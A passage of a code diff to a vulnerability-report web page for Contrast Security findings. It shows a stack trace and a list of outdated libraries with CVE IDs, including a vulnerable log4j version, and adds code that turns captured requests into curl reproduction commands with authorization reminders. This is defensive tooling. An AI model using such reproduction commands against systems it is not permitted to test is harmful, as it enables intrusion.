ategy.java:82)","org.apache.logging.log4j.core.Logger.log(Logger.java:161)","org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2205)","org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2159)","org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2142)","org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2034)","org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1899)","org.apache.logging.log4j.spi.AbstractLogger.info(AbstractLogger.java:1444)","com.contrast.frontgateservice.service.CustomUserDetailsService.loadUserByUsername(CustomUserDetailsService.java:24)","org.springframework.security.authentication.dao.DaoAuthenticationProvider.retrieveUser(DaoAuthenticationProvider.java:94)","org.springframework.security.authentication.dao.AbstractUserDetailsAuthenticationProvider.authenticate(AbstractUserDetailsAuthenticationProvider.java:133)","org.springframework.security.authentication.ProviderManager.authenticate(ProviderManager.java:182)","org.springframework.security.authentication.ProviderManager.authenticate(ProviderManager.java:201)","org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter.attemptAuthentication(UsernamePasswordAuthenticationFilter.java:85)","org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:223)","org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:213)","org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:346)","org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:103)","org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:89)","org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:346)","org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90)","org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75)","org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)","org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:346)","org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:110)","org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:80)","org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:346)","org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:55)","org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)","org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:346)","org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:221)","org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:186)","org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:354)","org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:267)","org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:178)","org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)","org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)","org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)","org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:178)","org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)","org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)","org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)","org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:178)","org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:153)","org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)","org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117)"],"vulnerableLibraries":[{"name":"tomcat-embed-core-9.0.75.jar","version":"9.0.75","latestVersion":"11.0.25","grade":"F","monthsOutdated":39,"classesUsed":419,"classCount":1533,"total":38,"cves":[{"id":"CVE-2024-50379","severity":"CRITICAL"},{"id":"CVE-2025-24813","severity":"CRITICAL"},{"id":"CVE-2024-56337","severity":"CRITICAL"},{"id":"CVE-2026-43512","severity":"CRITICAL"},{"id":"CVE-2026-41293","severity":"CRITICAL"},{"id":"CVE-2026-65905","severity":"CRITICAL"},{"id":"CVE-2025-55754","severity":"CRITICAL"},{"id":"CVE-2025-66614","severity":"CRITICAL"},{"id":"CVE-2026-65182","severity":"CRITICAL"},{"id":"CVE-2026-68525","severity":"CRITICAL"},{"id":"CVE-2026-43515","severity":"CRITICAL"},{"id":"CVE-2025-49124","severity":"HIGH"},{"id":"CVE-2023-46589","severity":"HIGH"},{"id":"CVE-2025-55752","severity":"HIGH"},{"id":"CVE-2025-48989","severity":"HIGH"},{"id":"CVE-2026-41284","severity":"HIGH"},{"id":"CVE-2024-24549","severity":"HIGH"},{"id":"CVE-2026-34483","severity":"HIGH"},{"id":"CVE-2026-43513","severity":"HIGH"},{"id":"CVE-2026-24880","severity":"HIGH"},{"id":"CVE-2023-44487","severity":"HIGH"},{"id":"CVE-2024-34750","severity":"HIGH"},{"id":"CVE-2025-48988","severity":"HIGH"},{"id":"CVE-2026-34487","severity":"HIGH"},{"id":"CVE-2025-49125","severity":"HIGH"},{"id":"CVE-2025-52434","severity":"HIGH"},{"id":"CVE-2025-53506","severity":"HIGH"},{"id":"CVE-2024-38286","severity":"HIGH"},{"id":"CVE-2025-52520","severity":"HIGH"},{"id":"CVE-2025-46701","severity":"HIGH"},{"id":"CVE-2026-42498","severity":"HIGH"},{"id":"CVE-2025-55668","severity":"MEDIUM"},{"id":"CVE-2023-41080","severity":"MEDIUM"},{"id":"CVE-2026-25854","severity":"MEDIUM"},{"id":"CVE-2025-61795","severity":"MEDIUM"},{"id":"CVE-2023-42795","severity":"MEDIUM"},{"id":"CVE-2023-45648","severity":"MEDIUM"},{"id":"CVE-2026-43514","severity":"LOW"}]},{"name":"spring-security-web-5.6.10.jar","version":"5.6.10","latestVersion":"7.1.0","grade":"F","monthsOutdated":41,"classesUsed":136,"classCount":428,"total":4,"cves":[{"id":"CVE-2026-22732","severity":"CRITICAL"},{"id":"CVE-2024-38821","severity":"CRITICAL"},{"id":"CVE-2026-47838","severity":"HIGH"},{"id":"CVE-2026-41706","severity":"MEDIUM"}]},{"name":"log4j-core-2.14.1.jar","version":"2.14.1","latestVersion":"2.26.1","grade":"F","monthsOutdated":63,"classesUsed":398,"classCount":1093,"total":7,"cves":[{"id":"CVE-2021-44228","severity":"CRITICAL"},{"id":"CVE-2021-45046","severity":"CRITICAL"},{"id":"CVE-2026-34480","severity":"HIGH"},{"id":"CVE-2021-44832","severity":"MEDIUM"},{"id":"CVE-2021-45105","severity":"MEDIUM"},{"id":"CVE-2026-34477","severity":"MEDIUM"},{"id":"CVE-2025-68161","severity":"MEDIUM"}]},{"name":"spring-web-5.3.27.jar","version":"5.3.27","latestVersion":"7.0.8","grade":"F","monthsOutdated":37,"classesUsed":276,"classCount":1010,"total":6,"cves":[{"id":"CVE-2016-1000027","severity":"CRITICAL"},{"id":"CVE-2024-22243","severity":"HIGH"},{"id":"CVE-2024-22262","severity":"HIGH"},{"id":"CVE-2024-22259","severity":"HIGH"},{"id":"CVE-2024-38820","severity":"MEDIUM"},{"id":"CVE-2024-38809","severity":"MEDIUM"}]},{"name":"spring-security-core-5.6.10.jar","version":"5.6.10","latestVersion":"7.1.0","grade":"F","monthsOutdated":41,"classesUsed":94,"classCount":330,"total":2,"cves":[{"id":"CVE-2024-22257","severity":"HIGH"},{"id":"CVE-2024-38827","severity":"MEDIUM"}]}]},"mcp":[{"tool":"search_vulnerabilities","args":{"page":1,"pageSize":50},"ms":596,"rows":27,"totalItems":27,"bytes":14705},{"tool":"get_vulnerability","args":{"vulnId":"4969-OAI2-GRZX-XIHA","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb"},"ms":15762,"rows":null,"totalItems":null,"bytes":64949}],"capturedAt":null}};</script>
+    <script src="assets/reports.js"></script>
     <script>
-        hljs.highlightAll();
+        // Shared behaviour lives in assets/reports.js so a fix lands once, not eight times.
+        const { esc, shortApp, HOSTED, hostedNotice, failureBanner } = Reports;
+        const SEV_CLASS = { Critical: 'severity-critical', High: 'severity-high', Medium: 'severity-medium', Low: 'severity-low', Note: 'severity-note' };
 
-        function switchTab(event, tabId) {
-            // Remove active class from all tabs and contents
-            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+        // Turn the captured raw HTTP request into a runnable curl command.
+        function toCurl(raw) {
+            if (!raw) return null;
+            const norm = raw.replace(/\r\n/g, '\n');
+            const split = norm.indexOf('\n\n');
+            const headPart = split === -1 ? norm : norm.slice(0, split);
+            const body = split === -1 ? '' : norm.slice(split + 2).trim();
+            const lines = headPart.split('\n').filter(Boolean);
+            if (!lines.length) return null;
 
-            // Add active class to clicked tab and corresponding content
-            event.target.classList.add('active');
-            document.getElementById(tabId).classList.add('active');
+            const [method, path] = lines[0].split(/\s+/);
+            const headers = lines.slice(1)
+                .map((l) => { const i = l.indexOf(':'); return i === -1 ? null : [l.slice(0, i).trim(), l.slice(i + 1).trim()]; })
+                .filter(Boolean)
+                .filter(([k]) => !['content-length', 'host'].includes(k.toLowerCase()));
+            const hostHeader = lines.slice(1).find((l) => /^host:/i.test(l));
+            const host = hostHeader ? hostHeader.split(':').slice(1).join(':').trim() : 'TARGET-HOST';
+
+            const parts = [`curl -i -X ${method || 'GET'} 'http://${host}${path || '/'}'`];
+            headers.forEach(([k, v]) => parts.push(`  -H '${k}: ${v.replace(/'/g, "'\\''")}'`));
+            if (body) parts.push(`  --data '${body.replace(/'/g, "'\\''")}'`);
+            return parts.join(' \\\n');
         }
+
+        function renderPicker(list, chosen) {
+            document.getElementById('vulnSelect').innerHTML = list.map((v) =>
+                `<option value="${esc(v.id)}" data-app="${esc(v.appId)}"${v.id === chosen ? ' selected' : ''}>` +
+                `${esc(v.severity)} — ${esc(v.title).slice(0, 80)} (${esc(shortApp(v.app))})</option>`).join('');
+        }
+
+        function renderDetail(d) {
+            if (!d) { document.getElementById('detail').innerHTML = ''; return; }
+            const curl = toCurl(d.httpRequest);
+            const sev = SEV_CLASS[d.severity] || 'severity-note';
+
+            const card = `<div class="vuln-card">
+                <div class="vuln-header">
+                    <div>
+                        <div class="vuln-title">${esc(d.title)}</div>
+                        <div class="vuln-id">${esc(d.id)}</div>
+                    </div>
+                    <span class="severity-badge ${sev}">${esc(d.severity)}</span>
+                </div>
+                <div class="vuln-meta">
+                    <div class="meta-item"><div class="meta-label">Application</div><div class="meta-value">${esc(shortApp(d.app))}</div></div>
+                    <div class="meta-item"><div class="meta-label">Rule</div><div class="meta-value">${esc(d.type)}</div></div>
+                    <div class="meta-item"><div class="meta-label">Status</div><div class="meta-value">${esc(d.status)}</div></div>
+                    <div class="meta-item"><div class="meta-label">Environment</div><div class="meta-value">${esc((d.environments || []).join(', ') || '—')}</div></div>
+                    <div class="meta-item"><div class="meta-label">First seen</div><div class="meta-value">${d.firstSeenAt ? new Date(d.firstSeenAt).toLocaleDateString() : '—'}</div></div>
+                    <div class="meta-item"><div class="meta-label">Last seen</div><div class="meta-value">${d.lastSeenAt ? new Date(d.lastSeenAt).toLocaleDateString() : '—'}</div></div>
+                </div>
+            </div>`;
+
+            const redaction = `<div class="alert alert-warning">
+                <span class="alert-icon">⚠️</span>
+                <div><strong>Values are redacted.</strong> Contrast strips sensitive headers and replaces sensitive
+                parameter values before returning the captured request, so placeholders such as
+                <code>contrast-redacted-financial-info</code> appear where real data was sent. Substitute your own
+                test values before running anything below.</div>
+            </div>`;
+
+            const req = d.httpRequest
+                ? `<h2 class="section-title">Captured Request</h2>
+                   <div class="code-block http-request"><button class="copy-btn" data-copy="req">Copy</button><pre id="req">${esc(d.httpRequest)}</pre></div>`
+                : `<h2 class="section-title">Captured Request</h2><div class="alert alert-warning"><span class="alert-icon">ℹ️</span>
+                   <div>No HTTP request was captured for this finding. Some rule types, such as configuration and
+                   cryptography checks, are found by inspecting the application rather than by observing a request.</div></div>`;
+
+            const curlBlock = curl
+                ? `<h2 class="section-title">Reproduction Command</h2>
+                   <div class="code-block curl-command"><button class="copy-btn" data-copy="curl">Copy</button><pre id="curl">${esc(curl)}</pre></div>`
+                : '';
+
+            const steps = d.httpRequest ? `<h2 class="section-title">Reproduction Steps</h2>
+                <div class="poc-steps">
+                    <div class="step"><div class="step-number">1</div><div class="step-content">
+                        <strong>Confirm you are authorized.</strong> Run this only against an environment you own or have
+                        written permission to test. This finding was observed in ${esc((d.environments || []).join(', ') || 'an unknown environment')}.</div></div>
+                    <div class="step"><div class="step-number">2</div><div class="step-content">
+                        <strong>Replace the redacted values.</strong> Swap each <code>contrast-redacted-*</code> placeholder
+                        and any session cookie for your own test values.</div></div>
+                    <div class="step"><div class="step-number">3</div><div class="step-content">
+                        <strong>Point it at your host.</strong> Change <code>TARGET-HOST</code> to the instance you are testing.</div></div>
+                    <div class="step"><div class="step-number">4</div><div class="step-content">
+                        <strong>Send the request and watch Contrast.</strong> The agent should raise ${esc(d.type)} again on
+                        ${esc(shortApp(d.app))}, which confirms the finding reproduces.</div></div>
+                    <div class="step"><div class="step-number">5</div><div class="step-content">
+                        <strong>Fix it.</strong> The <a href="smartfix_guide.html" style="color:#8fa2ff;">SmartFix guide</a>
+                        shows the remediation Contrast recommends for this same finding.</div></div>
+                </div>` : '';
+
+            document.getElementById('detail').innerHTML = card + redaction + req + curlBlock + steps;
+
+            document.querySelectorAll('.copy-btn').forEach((b) => {
+                b.addEventListener('click', () => {
+                    const el = document.getElementById(b.dataset.copy);
+                    navigator.clipboard.writeText(el.textContent).then(() => {
+                        const t = b.textContent; b.textContent = 'Copied'; setTimeout(() => { b.textContent = t; }, 1200);
+                    }).catch(() => { b.textContent = 'Copy failed'; });
+                });
+            });
+        }
+
+        async function load(id, appId) {
+            const banner = document.getElementById('errorBanner');
+            banner.style.display = 'none';
+            if (HOSTED) { hostedNotice(); return; }
+            try {
+                const q = id ? `?id=${encodeURIComponent(id)}&appId=${encodeURIComponent(appId || '')}` : '';
+                const res = await fetch('/api/vulnerability' + q, { cache: 'no-store' });
+                const ct = res.headers.get('content-type') || '';
+                if (!ct.includes('json')) throw new Error('NOT_REPORT_SERVER');
+                const d = await res.json();
+                if (!res.ok) throw new Error(d.error || res.statusText);
+                Reports.markLoaded(d);
+                renderPicker(d.list, d.detail ? d.detail.id : null);
+                renderDetail(d.detail);
+            } catch (err) {
+                const b = document.getElementById('sourceBadge');
+                b.textContent = 'NO DATA';
+                b.className = 'source-badge mock';
+                failureBanner(err);
+            }
+        }
+
+        document.getElementById('vulnSelect').addEventListener('change', (e) => {
+            const opt = e.target.selectedOptions[0];
+            load(e.target.value, opt && opt.dataset.app);
+        });
+        document.getElementById('refreshBtn').addEventListener('click', () => {
+            const sel = document.getElementById('vulnSelect');
+            const opt = sel.selectedOptions[0];
+            load(sel.value || undefined, opt && opt.dataset.app);
+        });
+        load();
     </script>
 </body>
 </html>
